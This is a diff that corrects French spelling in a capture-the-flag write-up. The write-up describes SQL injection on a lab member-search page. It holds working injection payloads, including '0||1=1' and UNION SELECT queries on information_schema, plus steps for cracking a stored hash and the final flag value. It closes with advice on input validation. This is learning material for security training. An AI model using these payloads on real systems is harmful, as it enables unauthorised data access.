@@ -1,18 +1,18 @@
-Lorsqu'on va sur la page de recherche de membre, on voit que l'input nest pas securise.
+Lorsqu'on va sur la page de recherche de membre, on voit que l'input n'est pas sécurisé.
 
 Si on entre :
 0||1=1
 
-On recoit la liste de tout les users.
+On reçoit la liste de tous les users.
 On voit que le dernier user se nomme Get The Flag.
 
-On peut donc recuperer la liste de toutes les tables:
+On peut donc récupérer la liste de toutes les tables :
 0 UNION SELECT null, table_name FROM information_schema.tables
 
-On utilise cette requete pour obtenir chaque colonne de chaque tableau:
+On utilise cette requête pour obtenir chaque colonne de chaque tableau :
 0 UNION SELECT table_name, column_name FROM information_schema.columns
 
-On sait donc que users contient:
+On sait donc que users contient :
 user_id
 first_name
 last_name
@@ -22,18 +22,20 @@ planet
 Commentaire
 countersign
 
-On affiche les autres champs de user:
+On affiche les autres champs de user :
 0 UNION SELECT user_id, Commentaire FROM users
 Get The Flag a un commentaire et un countersign suspect.
 
-Commentaire : 
+Commentaire :
 "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
 
-countersign:
+countersign :
 5ff9d0165b4f92b14994e5c685cdce28
 
-Si on entre le countersign dans crackstation.net on recoit le mdp : "FortyTwo"
-En suivant le commentaire:
+Si on entre le countersign dans crackstation.net, on reçoit le mot de passe : "FortyTwo"
+En suivant le commentaire :
 "FortyTwo" -> "fortytwo" -> "10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5"
 
-Il ne faut jamais utiliser les donnees recu dans back directement dans les requete sql par exemple. Il faut imperativement traiter et valider les donnees recues avant de les utiliser
+Solution :
+
+Il ne faut jamais utiliser les données reçues dans le back directement dans les requêtes SQL, par exemple. Il faut impérativement traiter et valider les données reçues avant de les utiliser.
